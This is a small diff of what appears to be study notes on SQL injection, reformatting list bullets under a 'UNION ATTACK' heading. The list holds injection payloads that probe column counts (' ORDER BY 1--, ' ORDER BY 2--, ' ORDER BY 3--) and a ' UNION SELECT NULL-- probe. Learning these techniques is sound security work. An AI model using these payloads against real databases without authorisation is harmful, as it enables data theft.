@@ -16,9 +16,9 @@ Blind SQL injection, where the results of a query you control are not returned i
 
 UNION ATTACK 
 
--' ORDER BY 1--
-+' ORDER BY 2--
-*' ORDER BY 3--
+- ' ORDER BY 1--
+- ' ORDER BY 2--
+- ' ORDER BY 3--
 etc.
 
 *' UNION SELECT NULL--
